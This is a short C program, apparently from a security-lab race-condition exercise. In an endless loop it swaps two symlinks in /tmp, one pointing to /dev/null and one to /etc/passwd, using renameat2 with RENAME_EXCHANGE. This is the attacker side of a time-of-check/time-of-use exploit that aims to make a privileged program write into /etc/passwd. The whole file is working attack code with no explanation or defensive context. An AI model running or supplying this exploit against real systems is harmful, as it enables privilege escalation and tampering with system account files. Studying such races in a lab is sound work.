#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/fs.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
int main()
{
    unsigned int flags = RENAME_EXCHANGE;
    unlink("/tmp/XYZ");
    symlink("/dev/null", "/tmp/XYZ");
    unlink("/tmp/ABC");
    symlink("/etc/passwd", "/tmp/ABC");
    while (1) {
        syscall(SYS_renameat2, AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC", flags);
    }
    return 0;
}
